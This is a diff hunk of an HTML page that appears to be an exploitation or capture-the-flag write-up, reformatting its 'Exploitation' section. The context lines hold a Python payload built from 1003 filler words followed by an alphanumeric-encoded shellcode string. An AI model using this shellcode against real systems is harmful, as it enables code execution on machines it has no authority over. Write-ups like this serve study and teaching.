@@ -150,10 +150,8 @@ Internet. See the references at the end of this article for more information.</p
 </div>
 <div class="section" id="exploitation">
 <h2>Exploitation</h2>
-<dl class="docutils">
-<dt>The first word should be the same as the last word, and the shellcode should be</dt>
-<dd>1004th word. That's all!</dd>
-</dl>
+<p>The first word should be the same as the last word, and the shellcode should be
+1004th word. That's all!</p>
 <div class="highlight"><pre><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;a &#39;</span> <span class="o">*</span> <span class="mi">1003</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx &#39;</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;a&#39;</span>
